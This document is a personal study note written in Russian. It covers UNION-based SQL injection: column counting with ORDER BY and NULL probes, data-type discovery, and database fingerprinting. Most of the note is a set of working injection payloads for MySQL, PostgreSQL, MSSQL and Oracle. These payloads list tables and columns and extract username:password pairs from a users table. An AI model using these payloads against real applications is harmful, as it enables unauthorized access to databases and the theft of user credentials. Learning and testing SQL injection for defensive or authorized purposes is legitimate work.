[[0Определение SQL Injection]] - карта раздела
## Оглавление
[[#Определение]]
[[#Условия реализации]]
[[#Определение необходимого количества столбцов]]
[[#Комментарии]]
[[#Поиск полезных типов данных в каждом столбце]]
[[#Извлечение интересных данных]]
	[[#Определение БД]]
	[[#MySQL]]
	[[#PostgreSQL]]
	[[#MSSQL]]
	[[#Oracle]]

### Определение

> [!info]
>когда в приложении есть SQL уязвимость мы можем использовать `UNION` чтобы забрать данные из остальных таблиц 
  Это ключевое слово помогает нам выполнить одно иди несколько вставок `SELECT` и объединить результат с оригинальным запросом 
  Пример
 
 ```sql
  SELECT a, b FROM table1 UNION SELECT c, d FROM table2
  ```
  этот запрос возвращает общий результат содержащий значения из `a` и `b` из  `table1` и колонки `c` и `d` из `table2`

---
### Условия реализации

> [!attention] 
> чтобы это все работало два ключевых требования должны совпасть
1 Отдельные запросы должны возвращать одинаковое количество столбцов
2 типы данных должны быть совместимы между отдельными запросами 
Чтобы убедится что это выполняется нужно узнать 
1 сколько столбцов возвращается из исходного запроса 
2 какие столбцы возвращенные из исходного запроса имеют подходящий тип хранения данных для результатов хранения введеного запроса

---
### Определение необходимого количества столбцов
Для этого существует два метода
Первый: использовать `ORDER BY` до появления ошибки то есть если используется `WHERE` можно использовать 
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- 
и так далее до появления ошибки
```
Так же приложение может не возвращать никаких данных при ошибке вообще что тоже является маркером

Второй: заключается в использовании `UNION SELECT` с использованием указания нулевых значений 
Пример:
```sql
' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--
и так далее
```
Потом смотрим ошибку она заключается в том что столбцов при использовании `UNION` должно быть одинаковое количество
если возникает ошибка `NullPointerException` то способ по факту не эффективен но может что то выстрели 

---
В Oracle Database синтаксис подразумевает использование для каждого `SELECT` нужно использовать `FROM` поэтому запрос будет выглядеть так
```SQL
' UNION SELECT 1 FROM DUAL--
```
Где `DUAL` специальная встроенная таблица с одной строкой и одним столбцом которую используют в этих случаях

---
## Комментарии
Комментарий обычный `--`
Альтернативный способ комментария `#`

---
### Поиск полезных типов данных в каждом столбце
Если запрос валиден не значит что мы получим значения, нужно в каждый столбец попробовать вписать данные по очереди
```sql
' UNION SELECT 'XXX',NULL,NULL,NULL--
' UNION SELECT  NULL,'XXX',NULL,NULL--
' UNION SELECT  NULL,NULL,'XXX',NULL--
' UNION SELECT  NULL,NULL,NULL,'XXX'--
```
Там где `ХХХ` отображается то эта строка совпадает с типом данных

---
### Извлечение интересных данных
Мы определили количество столбцов и типы данных в них для примера
- Исходный запрос возвращает два столбца оба из которых строковые данные,
- Точка ввода является заключенная в кавычки строка в предложении `WHERE`
- База данных содержит таблицу `users` со столбцами `username` и `password` 
можно использовать запрос:
```sql
' UNION SELECT username, password FROM users--
```
Для этой атаки надо надо знать состав таблицы и столбцы потому что угадывание работает редко поэтому все современные БД имеют структуры для получения таких данных
#### Определение БД
Смысл в том что мы уже имеем UNION уязвимость, если ошибка значит бд не та
[[#MySQL]]:
```sql
SELECT @@version;
SELECT version();
```
[[#PostgreSQL]]:
```sql
SELECT version();
```
[[#MSSQL]]:
```sql
SELECT @@version;
```
[[#Oracle]]:

---
#### MySQL

Узнать имя текущей БД
```sql
' UNION SELECT NULL,..., database()-- 
```
Список таблиц в базе
```sql
' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_schema = database()--
```
Если приложение отображает только одну строку можно добавить лимит
```sql
' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_schema = database()
  LIMIT 0,1--

' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_schema = database()
  LIMIT 1,1--

' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_schema = database()
  LIMIT 2,1--
```
Список колон конкретной таблицы
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = database() AND table_name = 'db_name'--
```
С `Limit` по колонке за раз
```sql
' UNION SELECT NULL, column_name
  FROM information_schema.columns
  WHERE table_schema = database() AND table_name = 'db_name' LIMIT 0,1--
```
Пример вытаскиваем сами данные
```sql
' UNION SELECT NULL,
       CONCAT(username, ':', password)
  FROM users--
```
---
#### PostgreSQL

Узнать текущую бд
```sql
' UNION SELECT NULL, current_database()--=
```
Таблицы 
```sql
' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_schema = 'public'--
```
Если таблицы в других схемах то придется перебирать `table_schema`
Колонки
```sql
' UNION SELECT NULL, column_name
  FROM information_schema.columns
  WHERE table_schema = 'public'
    AND table_name = 'users'--
```
Данные
```sql
' UNION SELECT NULL,
       username || ':' || password
  FROM users--
```
---
#### MSSQL

Текущая БД
```sql
' UNION SELECT NULL, db_name()--
```
Таблицы
```sql
' UNION SELECT NULL, table_name
  FROM information_schema.tables
  WHERE table_type = 'BASE TABLE'--
  
  #или через системный каталог 
  
  ' UNION SELECT NULL, name
  FROM sys.tables--
```
Колонки
```sql
' UNION SELECT NULL, column_name
  FROM information_schema.columns
  WHERE table_name = 'users'--
  
  #или
  
  ' UNION SELECT NULL, c.name
  FROM sys.columns c
  JOIN sys.tables t ON c.object_id = t.object_id
  WHERE t.name = 'users'--
```
Данные
```sql
' UNION SELECT NULL,
       username + ':' + password
  FROM users--

#или если разные типы данных привести к varchar

' UNION SELECT NULL,
       CAST(id AS varchar(10)) + ':' + username + ':' + password
  FROM users--
```

---
#### Oracle

Нужен `FROM` каждом `SELECT` часто через `DUAL`

Узнать текущего пользователя/схему
```sql
' UNION SELECT NULL, user FROM DUAL--

```
Для всех таблиц к которым текущий пользователь имеет доступ
```sql
' UNION SELECT NULL, table_name
  FROM all_tables--
```
Колонки
```sql
' UNION SELECT NULL, column_name
  FROM all_tab_columns
  WHERE table_name = 'USERS'--
```
Данные
```sql
' UNION SELECT NULL,
       username || ':' || password
  FROM users--
```
Если нужно через `DUAL` (для каких-то отдельных проверок):
```sql
' UNION SELECT NULL,
       (SELECT username || ':' || password FROM users WHERE ROWNUM = 1)
  FROM DUAL--
```

[[#Оглавление]]
